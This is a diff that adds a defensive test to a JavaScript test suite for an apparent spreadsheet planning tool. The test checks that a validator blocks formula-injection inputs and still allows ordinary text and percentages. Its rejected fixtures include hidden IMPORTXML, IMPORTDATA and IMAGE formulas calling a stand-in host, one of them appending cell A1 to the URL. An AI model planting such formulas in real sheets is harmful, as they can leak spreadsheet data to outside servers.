@@ -175,6 +175,11 @@ const ends = (env, re) => env.audit().filter((a) => re.test(a.action) && a.phase
   assert.equal(ok.status, 'DONE', ok.error);
   assert.equal(engRows(env, 'PRODUCT', planId)[0].Reason, '- 前年の反動（=見込み）');
   assert.equal(env.scratch().getSheetByName('PRODUCT').fmls.flat().filter(Boolean).length, 0, '計算用ブックに数式を作らない');
+  // 「+」「-」の後に記号や数を挟んで、関数の呼び出しを隠す書き方も止める（ふつうの文・数・増減率は通す）
+  const check = (v) => { try { env.run('appPlanCheckArgs_(__v)', { __v: [v] }); return 'ok'; } catch (e) { return /数式として動いてしまう文字/.test(e.message) ? 'bad' : e.message; } };
+  for (const v of ['--IMPORTXML("https://x/?"&A1,"//a")', '+"a"&IMPORTXML("https://x","//a")', '+1+IMPORTXML("https://x","//a")', '-0-IMPORTDATA("https://x")',
+    '+{IMPORTXML("https://x","//a")}', " +'x'", '- 1 + image ("https://x")', '=1', ' =A1', '+SUM(A1:A9)', '-A1']) assert.equal(check(v), 'bad', v);
+  for (const v of ['+5%', '-5%', '-1,000', '+0.5', '-', '- 前年の反動（=見込み）', '+5% (DX推進)', '-3% Q4は反動', '前年比 +5%（IMPORTXML(…) とは無関係）', 'メール@例', '']) assert.equal(check(v), 'ok', v);
 }
 
 // ==== 6. 画面から裏の受け渡しの項目（組み立て済みの印・予測の番号など）を渡されても使わない ====
